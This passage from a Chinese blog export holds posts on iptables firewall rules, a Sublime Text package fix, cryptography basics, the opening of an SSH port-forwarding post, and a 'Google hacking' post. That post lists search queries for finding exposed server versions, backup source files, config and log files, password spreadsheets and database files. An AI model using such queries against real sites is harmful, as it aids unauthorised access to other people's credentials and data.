<span class="line">-s 匹配来源地址IP/MASK，加叹号<span class="string">"!"</span>表示除这个IP外。</span>
<span class="line">-d 匹配目标地址</span>
<span class="line">-i 网卡名称 匹配从这块网卡流入的数据</span>
<span class="line">-o 网卡名称 匹配从这块网卡流出的数据</span>
<span class="line">-p 匹配协议,如tcp,udp,icmp</span>
<span class="line">--dport num 匹配目标端口号</span>
<span class="line">--sport num 匹配来源端口号</span>
</pre></td></tr></table></figure>

<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a><a href="#示例：" title="示例："></a>示例：</h2><h3 id="删除已有规则："><a href="#删除已有规则：" class="headerlink" title="删除已有规则："></a><a href="#删除已有规则：" title="删除已有规则："></a>删除已有规则：</h3><p>在建立新的规则前，可能需要删除旧的规则，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -F  (or) iptables -flush</span>
</pre></td></tr></table></figure>

<h3 id="设置链的默认规则："><a href="#设置链的默认规则：" class="headerlink" title="设置链的默认规则："></a><a href="#设置链的默认规则：" title="设置链的默认规则："></a>设置链的默认规则：</h3><p>所有链的默认规则为”ACCEPT”，若需将其它链(INPUT、FORWARD、OUTPUT)设置成”DROP”（拒绝），命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -P INPUT DROP</span>
<span class="line">$ iptables -P FORWARD DROP</span>
<span class="line">$ iptables -P OUTPUT DROP</span>
</pre></td></tr></table></figure>

<h3 id="拒绝指定ip地址："><a href="#拒绝指定ip地址：" class="headerlink" title="拒绝指定ip地址："></a><a href="#拒绝指定ip地址：" title="拒绝指定ip地址："></a>拒绝指定ip地址：</h3><p>当发现某个ip的异常连接，可以使用该命令阻止该地址的连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -s x.x.x.x -j drop</span>
</pre></td></tr></table></figure>

<p>对特定网卡的使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -i eth0 -s x.x.x.x -j DROP</span>
<span class="line">$ iptables -A INPUT -i eth0 -p tcp -s x.x.x.x -j DROP</span>
</pre></td></tr></table></figure>

<h3 id="允许所有SSH的连接："><a href="#允许所有SSH的连接：" class="headerlink" title="允许所有SSH的连接："></a><a href="#允许所有SSH的连接：" title="允许所有SSH的连接："></a>允许所有SSH的连接：</h3><p>允许所有外部的ssh连接，且只允许eth0接口目标端口为22的数据包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="仅允许指定网络的SSH连接请求："><a href="#仅允许指定网络的SSH连接请求：" class="headerlink" title="仅允许指定网络的SSH连接请求："></a><a href="#仅允许指定网络的SSH连接请求：" title="仅允许指定网络的SSH连接请求："></a>仅允许指定网络的SSH连接请求：</h3><p>例如允许来自于192.168.1.0/24域的用户的ssh连接请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp -s 192.168.1.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许http或https的连接请求："><a href="#允许http或https的连接请求：" class="headerlink" title="允许http或https的连接请求："></a><a href="#允许http或https的连接请求：" title="允许http或https的连接请求："></a>允许http或https的连接请求：</h3><p>允许所有的http请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>允许所有的https请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许本地发起的ssh请求："><a href="#允许本地发起的ssh请求：" class="headerlink" title="允许本地发起的ssh请求："></a><a href="#允许本地发起的ssh请求：" title="允许本地发起的ssh请求："></a>允许本地发起的ssh请求：</h3><p>注意这与允许ssh连入的区别</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="仅允许从本地发起到一个指定的网络的SSH请求："><a href="#仅允许从本地发起到一个指定的网络的SSH请求：" class="headerlink" title="仅允许从本地发起到一个指定的网络的SSH请求："></a><a href="#仅允许从本地发起到一个指定的网络的SSH请求：" title="仅允许从本地发起到一个指定的网络的SSH请求："></a>仅允许从本地发起到一个指定的网络的SSH请求：</h3><p>例如仅允许从内部连接到网域192.168.1.0/24</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp -d 192.168.1.0/24 --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许从本地发起的HTTPS连接请求："><a href="#允许从本地发起的HTTPS连接请求：" class="headerlink" title="允许从本地发起的HTTPS连接请求："></a><a href="#允许从本地发起的HTTPS连接请求：" title="允许从本地发起的HTTPS连接请求："></a>允许从本地发起的HTTPS连接请求：</h3><p>如果你想允许用户访问互联网，该规则能是用户发出安全的web流量请求，且能使用wget下载外部文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --dport 443 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -i eth0 -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>如果需要允许http请求，只需将443改为80即可</p>
<h3 id="使用multiport-将多个规则结合起来："><a href="#使用multiport-将多个规则结合起来：" class="headerlink" title="使用multiport 将多个规则结合起来："></a><a href="#使用multiport-将多个规则结合起来：" title="使用multiport 将多个规则结合起来："></a>使用multiport 将多个规则结合起来：</h3><p>为了减少为每个端口都写一条独立规则的麻烦，可以使用multiport组合成一条规则。<br>例如允许所有ssh,http,https的流量访问</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp -m multiport --dports 22,80,443 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp -m multiport --sports 22,80,443 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许外部ping内部主机："><a href="#允许外部ping内部主机：" class="headerlink" title="允许外部ping内部主机："></a><a href="#允许外部ping内部主机：" title="允许外部ping内部主机："></a>允许外部ping内部主机：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -p icmp --icmp-type <span class="built_in">echo</span>-request -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -p icmp --icmp-type <span class="built_in">echo</span>-reply   -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许内部ping外部主机："><a href="#允许内部ping外部主机：" class="headerlink" title="允许内部ping外部主机："></a><a href="#允许内部ping外部主机：" title="允许内部ping外部主机："></a>允许内部ping外部主机：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -p icmp --icmp-type <span class="built_in">echo</span>-request -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -p icmp --icmp-type <span class="built_in">echo</span>-reply -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许回环访问："><a href="#允许回环访问：" class="headerlink" title="允许回环访问："></a><a href="#允许回环访问：" title="允许回环访问："></a>允许回环访问：</h3><p>在本地可以访问127.0.0.1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -i lo -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o lo -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="负载平衡传入的网络流量："><a href="#负载平衡传入的网络流量：" class="headerlink" title="负载平衡传入的网络流量："></a><a href="#负载平衡传入的网络流量：" title="负载平衡传入的网络流量："></a>负载平衡传入的网络流量：</h3><p>使用iptables可以实现传入web流量的负载均衡<br>例如使用iptables nth将HTTPS流量负载平衡至三个不同的ip地址。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 0 -j DNAT --to-destination 192.168.1.11:443</span>
<span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 1 -j DNAT --to-destination 192.168.1.12:443</span>
<span class="line">$ iptables -A PREROUTING -i eth0 -p tcp --dport 443 -m state --state NEW -m nth --counter 0 --every 3 --packet 2 -j DNAT --to-destination 192.168.1.13:443</span>
</pre></td></tr></table></figure>

<h3 id="允许出站的DNS查询请求："><a href="#允许出站的DNS查询请求：" class="headerlink" title="允许出站的DNS查询请求："></a><a href="#允许出站的DNS查询请求：" title="允许出站的DNS查询请求："></a>允许出站的DNS查询请求：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A OUTPUT -p udp -o eth0 --dport 53 -j ACCEPT</span>
<span class="line">$ iptables -A INPUT  -p udp -i eth0 --sport 53 -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许内部网络域和外部网络通信："><a href="#允许内部网络域和外部网络通信：" class="headerlink" title="允许内部网络域和外部网络通信："></a><a href="#允许内部网络域和外部网络通信：" title="允许内部网络域和外部网络通信："></a>允许内部网络域和外部网络通信：</h3><p>如果防火墙上有两个网卡：eth1连接到外部网络(互联网)，eth0连接到内部网络(例如:192.168.1.x)。<br>使用以下规则允许内部网络与外部网络的通信</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许来自指定网络的rsync请求："><a href="#允许来自指定网络的rsync请求：" class="headerlink" title="允许来自指定网络的rsync请求："></a><a href="#允许来自指定网络的rsync请求：" title="允许来自指定网络的rsync请求："></a>允许来自指定网络的rsync请求：</h3><p>多数情况MySQL和web服务在同一台服务器上，现在我们仅希望某些人员从内部网络(192.168.1.0/24)登陆数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -i eth0 -p tcp -s 192.168.1.0/24 --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 3306 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许Sendmail-Postfix邮件服务："><a href="#允许Sendmail-Postfix邮件服务：" class="headerlink" title="允许Sendmail, Postfix邮件服务："></a><a href="#允许Sendmail-Postfix邮件服务：" title="允许Sendmail, Postfix邮件服务："></a>允许Sendmail, Postfix邮件服务：</h3><p>Sendmail和postfix都使用了25端口，因此只需允许来自25端口的连接请求即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 25 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 25 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许IMAP和IMAPS："><a href="#允许IMAP和IMAPS：" class="headerlink" title="允许IMAP和IMAPS："></a><a href="#允许IMAP和IMAPS：" title="允许IMAP和IMAPS："></a>允许IMAP和IMAPS：</h3><p>例如允许IMAP/IMAP2流量，端口为143</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 143 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 143 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>例如允许IMAPS流量，端口为993</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 993 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 993 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="允许POP3和POP3S访问："><a href="#允许POP3和POP3S访问：" class="headerlink" title="允许POP3和POP3S访问："></a><a href="#允许POP3和POP3S访问：" title="允许POP3和POP3S访问："></a>允许POP3和POP3S访问：</h3><p>例如允许POP3</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 110 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 110 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>例如允许POP3S访问</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 995 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 995 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="防止Dos攻击："><a href="#防止Dos攻击：" class="headerlink" title="防止Dos攻击："></a><a href="#防止Dos攻击：" title="防止Dos攻击："></a>防止Dos攻击：</h3><p>命令如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 25/minute --<span class="built_in">limit</span>-burst 100 -j ACCEPT</span>
</pre></td></tr></table></figure>

<p>参数解释：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
</pre></td><td class="code"><pre><span class="line">-m limit: 启用limit扩展</span>
<span class="line">–limit 25/minute: 允许最多每分钟25个连接（根据需求更改）。</span>
<span class="line">–limit-burst 100: 只有当连接达到limit-burst水平(此例为100)时才启用上述limit/minute限制。</span>
</pre></td></tr></table></figure>

<h3 id="端口转发："><a href="#端口转发：" class="headerlink" title="端口转发："></a><a href="#端口转发：" title="端口转发："></a>端口转发：</h3><p>将来自422端口的流量全部转到22端口。<br>这样我们既能通过422端口也能通过22端口进行ssh连接，启用DNAT转发。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -t nat -A PREROUTING -p tcp -d 192.168.1.37 --dport 422 -j DNAT --to 192.168.1.37:22</span>
</pre></td></tr></table></figure>

<p>还需要允许连接到442端口的请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT  -i eth0 -p tcp --dport 422 -m state --state NEW,ESTABLISHED -j ACCEPT</span>
<span class="line">$ iptables -A OUTPUT -o eth0 -p tcp --sport 422 -m state --state ESTABLISHED -j ACCEPT</span>
</pre></td></tr></table></figure>

<h3 id="记录丢弃的数据包"><a href="#记录丢弃的数据包" class="headerlink" title="记录丢弃的数据包"></a><a href="#记录丢弃的数据包" title="记录丢弃的数据包"></a>记录丢弃的数据包</h3><p>1、新建一个链名为loging</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -N loging</span>
</pre></td></tr></table></figure>

<p>2、将所有来自INPUT链的数据包跳转到loging链中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A INPUT -j loging</span>
</pre></td></tr></table></figure>

<p>3、为这些包自定义前缀，命为‘iptables packet dropped’</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A loging -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 2/min -j LOG --<span class="built_in">log</span>-prefix <span class="string">"iptables packet dropped: "</span> --<span class="built_in">log</span>-level 7</span>
</pre></td></tr></table></figure>

<p>4、丢弃这些数据包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">$ iptables -A loging -j DROP</span>
</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime Text3无法安装包解决</title>
    <url>/2018/Sublime-Text3%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E5%8C%85%E8%A7%A3%E5%86%B3.html</url>
    <content><![CDATA[<p>最近学习GO语言用package control安装插件时，一直报错如下图：<br><img src="/images/upload/2019-02-282.png" alt="报错图片1"><br><img src="/images/upload/2019-02-281.png" alt="报错图片2"><br>看样子是channel_v3.json这个文件不能访问，然后将解决办法汇总如下。<a id="more"></a></p>
<h2 id="1-利用github"><a href="#1-利用github" class="headerlink" title="1.利用github"></a><a href="#1-利用github" title="1.利用github"></a>1.利用github</h2><p>通过官方下载最新的channel_v3文件，上传到自己的Github，然后修改Package Control的channels。<br>官方:<a href="https://packagecontrol.io/channel_v3.json" target="_blank" rel="noopener">channel_v3.json</a><br>有该问题且嫌麻烦的伙伴可以使用我的地址：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
</pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/knight-TBO/channel_v3/master/channel_v3.json</span>
</pre></td></tr></table></figure>

<p>使用方法：<br><img src="/images/upload/2019-02-283.png" alt="use1"><br><img src="/images/upload/2019-02-284.png" alt="use2"><br>在配置文件下添加下面的语句即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
<span class="line">2</span>
<span class="line">3</span>
<span class="line">4</span>
</pre></td><td class="code"><pre><span class="line"><span class="string">"channels"</span>:</span>
<span class="line">    [</span>
<span class="line">        <span class="string">"https://raw.githubusercontent.com/knight-TBO/channel_v3/master/channel_v3.json"</span></span>
<span class="line">    ],</span>
</pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>编程</tag>
        <tag>计算机</tag>
      </tags>
  </entry>
  <entry>
    <title>googlehack</title>
    <url>/2018/googlehack.html</url>
    <content><![CDATA[<p>Google是一个伟大的信息收集工具，在如今的互联网时代，想想看一个人可以轻易的从搜索引擎中获取你详细的个人信息是件多么叫人激动又害怕的事情。Google也可以当作我们的第二个“社工库”。<a id="more"></a><br>More info:<a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">Google Hacking</a></p>
<h2 id="Google基本关键词"><a href="#Google基本关键词" class="headerlink" title="Google基本关键词"></a><a href="#Google基本关键词" title="Google基本关键词"></a>Google基本关键词</h2><p>Intext： 搜索出现的关键词<br>Inurl： 搜索包含关键词的url<br>Intitle： 搜索包含关键词的标题<br>Site： 搜索包含关键词的站点<br>filetype： 搜索包含关键词的文件类型<br>Link： 对于页面包含的外部链接搜索<br>Daterange： 搜索特定的日期范围</p>
<h2 id="Google基本规则"><a href="#Google基本规则" class="headerlink" title="Google基本规则"></a><a href="#Google基本规则" title="Google基本规则"></a>Google基本规则</h2><p>Google 不分大小写<br>Google 可以使用通配符：*表示一个词/字<br>Google 会智能地保留一些内容，比如一些过时的词，一些不适合呈现的内容（比如违法信息）<br>最常用的：”关键字” ，双引号会使Google强制搜索包含关键字的内容布尔操作符：AND(+) NOT(-) OR(|)，AND 现在已不需要，多个关键字google会都匹配到</p>
<h2 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a><a href="#常用示例" title="常用示例"></a>常用示例</h2><h3 id="1、目录列表查找"><a href="#1、目录列表查找" class="headerlink" title="1、目录列表查找"></a><a href="#1、目录列表查找" title="1、目录列表查找"></a>1、目录列表查找</h3><p>目录列表能列出存在于一个web服务器上的文件和目录<br>查找目录列表<br>实例：<br>intitle:index.of 这里的休止符代表的是单个字母的通配符<br>更优化的查找<br>实例：<br>intitle:index.of “parent directory”<br>intitle:index.of name size</p>
<h3 id="2、特定版本的）服务器"><a href="#2、特定版本的）服务器" class="headerlink" title="2、特定版本的）服务器"></a><a href="#2、特定版本的）服务器" title="2、特定版本的）服务器"></a>2、特定版本的）服务器</h3><p>能被攻击者用来决定攻击web服务器最佳方法的一小段信息，就是确切的服务器版本<br>实例：<br>intitle:index.of “server at”<br>intitle:index.of “Apache/1.3.27 Server at”</p>
<h3 id="3、扩展遍历技术"><a href="#3、扩展遍历技术" class="headerlink" title="3、扩展遍历技术"></a><a href="#3、扩展遍历技术" title="3、扩展遍历技术"></a>3、扩展遍历技术</h3><p>经常会出现web页面的备份文件，他们有泄露源码的倾向。常常在配置错误的时候出现这种问题，把php代码备份到不是以php结尾的文件中，比如bak<br>实例：<br>intitle:index.of index.php.bak<br>inurl:index.php.bak</p>
<h3 id="4、配置文件的查找"><a href="#4、配置文件的查找" class="headerlink" title="4、配置文件的查找"></a><a href="#4、配置文件的查找" title="4、配置文件的查找"></a>4、配置文件的查找</h3><p>配置文件的存在说明服务就在附近<br>实例：<br>filetype:conf inurl:firewall<br>如果你能知道配置文件的名字也是一个非常好的搜索方式，当然你可以从配置文件中抽取特定的字符串来查询，如果能再配上软件名字的话就效果更好了</p>
<h3 id="5、日志文件的查找"><a href="#5、日志文件的查找" class="headerlink" title="5、日志文件的查找"></a><a href="#5、日志文件的查找" title="5、日志文件的查找"></a>5、日志文件的查找</h3><p>日志文件中也记录着日志很多的敏感信息<br>日志文件也有一个默认的名字可以被我们用作基础的搜索，最常见的扩展名就是log了<br>实例：<br>filetype:log inurl:log<br>ext log log<br>filetype:log username putty</p>
<h3 id="6、office文档"><a href="#6、office文档" class="headerlink" title="6、office文档"></a><a href="#6、office文档" title="6、office文档"></a>6、office文档</h3><p>实例：<br>filetype:xls inurl:password.xls<br>filetype:xls username password email</p>
<h3 id="6、登录入口"><a href="#6、登录入口" class="headerlink" title="6、登录入口"></a><a href="#6、登录入口" title="6、登录入口"></a>6、登录入口</h3><p>登录入口是第一道防线，很容易泄露软硬件的信息<br>查找入口一般使用关键字login<br>大的厂商一般会把版权的注意事项放在页面的底部<br>实例：<br>intitle:login intext:版权信息</p>
<h3 id="7、错误消息"><a href="#7、错误消息" class="headerlink" title="7、错误消息"></a><a href="#7、错误消息" title="7、错误消息"></a>7、错误消息</h3><p>数据库的错误消息能够用来分析操作系统和web服务器的版本，还可能更多<br>SQL command not properly ended<br>这个表示没有在sql语句的最后找到正确的终止符，所以可能会被用于注入攻击</p>
<h3 id="8、真实的数据库文件"><a href="#8、真实的数据库文件" class="headerlink" title="8、真实的数据库文件"></a><a href="#8、真实的数据库文件" title="8、真实的数据库文件"></a>8、真实的数据库文件</h3><p>攻击者还能直接搜索到数据库本身，并不适合所有的数据库系统，只适合哪些有着特定名字或者扩展名的数据库,因为是二进制文件，所以没法在里面搜索字符<br>实例：<br>filetype:mdb inurl:com</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学笔记</title>
    <url>/2018/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<p>1.<br>加密方法可以分为两大类。一类是单钥加密（private key cryptography），还有一类叫做双钥加密（public key cryptography）。前者的加密和解密过程都用同一套密码，后者的加密和解密过程用的是两套密码。历史上，人类传统的加密方法都是前一种，比如二战期间德军用的Enigma电报密码。<a id="more"></a>莫尔斯电码也可以看作是一种私钥加密方法。</p>
<p>2.<br>在单钥加密的情况下，密钥只有一把，所以密钥的保存变得很重要。一旦密钥泄漏，密码也就被破解。</p>
<p>3.<br>在双钥加密的情况下，密钥有两把，一把是公开的公钥，还有一把是不公开的私钥。</p>
<p>双钥加密的原理如下：<br>a) 公钥和私钥是一一对应的关系，有一把公钥就必然有一把与之对应的、独一无二的私钥，反之亦成立。</p>
<p>b) 所有的（公钥, 私钥）对都是不同的。</p>
<p>c) 用公钥可以解开私钥加密的信息，反之亦成立。</p>
<p>d) 同时生成公钥和私钥应该相对比较容易，但是从公钥推算出私钥，应该是很困难或者是不可能的。</p>
<p>4.<br>目前，通用的单钥加密算法为DES（Data Encryption Standard），通用的双钥加密算法为RSA（ Rivest-Shamir-Adleman），都产生于上个世纪70年代。<br>5.<br>在双钥体系中，公钥用来加密信息，私钥用来数字签名。<br>6.<br>因为任何人都可以生成自己的（公钥，私钥）对，所以为了防止有人散布伪造的公钥骗取信任，就需要一个可靠的第三方机构来生成经过认证的（公钥，私钥）对。目前，世界上最主要的数字服务认证商是位于美国加州的Verisign公司，它的主要业务就是分发RSA数字证书。</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH端口转发</title>
    <url>/2018/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.html</url>
    <content><![CDATA[<h2 id="一、-简述"><a href="#一、-简述" class="headerlink" title="一、 简述"></a><a href="#一、-简述" title="一、 简述"></a>一、 简述</h2><p>SSH在维基百科的定义：Secure hell（安全外壳协议，简称SSH）是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。SSH最常见的用途是远程登录系统，人们通常利用SSH来传输命令行界面和远程执行命令。<a id="more"></a><br>More info: <a href="https://zh.wikipedia.org/wiki/Secure_Shell" target="_blank" rel="noopener">SSH</a></p>
<h3 id="端口转发简述："><a href="#端口转发简述：" class="headerlink" title="端口转发简述："></a><a href="#端口转发简述：" title="端口转发简述："></a>端口转发简述：</h3><p>但大多数人不知道的是SSH还能提供端口转发，并提供相应的加密及解密服务这也被称为“隧道”(tunneling)，而该功能在可以在有防火墙限制时，转发其它TCP流量来通过SSH端口传输，也就实现了“翻墙”。<br>1.加密 SSH Client 端至 SSH Server 端之间的通讯数据。<br>2.突破防火墙的限制完成一些之前无法建立的 TCP 连接。<br><img src="/images/upload/2018-08-251.jpg" alt=""><br>如上图所示，TCP端口A和B并不直接通信，而是转发到SSH client及SSH server来进行通信，从而实现了数据加密<br>同时可以绕过防火墙的限制。</p>
<hr>
<h2 id="二、-本地转发与远程转发"><a href="#二、-本地转发与远程转发" class="headerlink" title="二、 本地转发与远程转发"></a><a href="#二、-本地转发与远程转发" title="二、 本地转发与远程转发"></a>二、 本地转发与远程转发</h2><h3 id="本地转发示例："><a href="#本地转发示例：" class="headerlink" title="本地转发示例："></a><a href="#本地转发示例：" title="本地转发示例："></a>本地转发示例：</h3><p>现在假设Server上某个端口的服务不能被远程连接，但它的SSH端口却可以连接，那此时我们就可以通过SSH隧道建立本地转发来连接Server上的端口。<br>本地转发的命令格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span>
